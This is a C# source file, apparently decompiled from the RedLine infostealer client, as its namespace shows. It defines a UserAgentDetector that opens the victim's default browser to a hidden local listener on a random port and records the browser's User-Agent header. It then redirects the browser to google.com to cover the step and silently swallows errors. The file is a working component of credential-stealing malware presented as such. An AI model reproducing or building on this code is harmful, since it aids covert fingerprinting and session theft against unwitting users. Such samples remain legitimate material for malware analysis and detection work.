using System;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace RedLine.Client.Logic.Others
{
	public static class UserAgentDetector
	{
		private static int port;

		private static string useragent;

		static UserAgentDetector()
		{
			port = new Random().Next(13000, 14000);
		}

		public static string GetUserAgent()
		{
			try
			{
				StartServer(port);
				Process.Start($"http://localhost:{port}");
				long ticks = DateTime.Now.Ticks;
				while (useragent == null && new TimeSpan(DateTime.Now.Ticks - ticks).TotalSeconds < 60.0)
				{
					Thread.Sleep(100);
				}
			}
			catch
			{
			}
			return useragent;
		}

		private static void StartServer(int port)
		{
			string[] obj = new string[1]
			{
				$"http://localhost:{port}/"
			};
			HttpListener httpListener = new HttpListener();
			string[] array = obj;
			foreach (string uriPrefix in array)
			{
				httpListener.Prefixes.Add(uriPrefix);
			}
			httpListener.Start();
			new Thread(Listen).Start(httpListener);
		}

		private static void Listen(object listenerObj)
		{
			HttpListener obj = listenerObj as HttpListener;
			HttpListenerContext context = obj.GetContext();
			useragent = context.Request.Headers["User-Agent"];
			HttpListenerResponse response = context.Response;
			response.Redirect("https://google.com/");
			response.Close();
			obj.Stop();
		}
	}
}
